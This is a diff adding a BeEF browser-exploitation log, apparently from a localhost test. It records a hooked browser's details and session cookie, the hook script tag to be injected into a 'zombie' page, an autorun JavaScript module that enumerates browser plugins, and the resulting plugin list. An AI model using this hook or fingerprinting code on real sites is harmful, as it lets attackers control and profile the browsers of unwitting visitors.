@@ -1,0 +1,68 @@
+[15/06/15 11:36:00 127.0.0.1] 127.0.0.1
+[15/06/15 11:36:00 127.0.0.1] Firefox 17.0 - Mozilla/5.0 (Windows NT 6.1
+[15/06/15 11:36:00 127.0.0.1] Mozilla/5.0 (Windows NT 6.1; WOW64; rv:17.0) Gecko/20100101 Firefox/17.0
+[15/06/15 11:47:10 127.0.0.1] Autorun set with code:
+function do_main(){    
+
+    if (navigator.plugins && navigator.plugins.length > 0) {
+        var pluginsArrayLength = navigator.plugins.length;
+        
+        for (pluginsArrayCounter=0; pluginsArrayCounter < pluginsArrayLength; pluginsArrayCounter++ ) {
+            result += navigator.plugins[pluginsArrayCounter].name;
+            if(pluginsArrayCounter < pluginsArrayLength-1) {
+            	result += String.fromCharCode(10);
+            }
+        }
+    }
+}
+
+var result = "";
+
+do_main();
+
+return_result(result_id, result);
+
+[15/06/15 13:16:32 127.0.0.1] 127.0.0.1
+[15/06/15 13:16:32 127.0.0.1] Firefox 17.0 - Mozilla/5.0 (Windows NT 6.1
+[15/06/15 13:16:32 127.0.0.1] Mozilla/5.0 (Windows NT 6.1; WOW64; rv:17.0) Gecko/20100101 Firefox/17.0
+[15/06/15 13:16:32 127.0.0.1] Screen: 1760x990 with 24-bit colour
+[15/06/15 13:16:32 127.0.0.1] Requested URL: http://localhost/bf/hook/example.php
+[15/06/15 13:16:32 127.0.0.1] Cookie: BeEFSession=ii668e9r63iakb3po5mkpbh2v3
+[15/06/15 13:16:32 127.0.0.1] HTML Contents: 
+ <br>BeEF Test Page<br><br>
+
+
+	The following code needs to be included in the zombie:<br>
+	<code>
+	&lt;script language='Javascript'
+	src="http://http://localhost/bf//hook/beefmagic.js.php'&gt;&lt;/script&gt;
+    </code>
+    <br>
+    
+
+
+
+[15/06/15 13:16:34 127.0.0.1] Module Result: 
+npLodop6.0
+Tencent QQ
+Java(TM) Platform SE 8 U40
+Java Deployment Toolkit 8.0.400.25
+Alipay Security Control 3
+Alipay Security Payment Client Suit
+npalicdo plugin
+Security Control
+Google Update
+QQGamePlugin Pro
+Tencent SSO Platform
+QQMusic
+Shockwave Flash
+Alipay security control
+Alipay webmod control
+QQMiniDL Plugin
+npQQPhotoDrawEx
+QQMail Plugin
+Tencent FTN plug-in
+Silverlight Plug-In
+iTrusChina iTrusPTA,XEnroll,iEnroll,hwPTA,UKeyInstalls Firefox Plugin
+Microsoft Office 2010
+Microsoft Office 2010
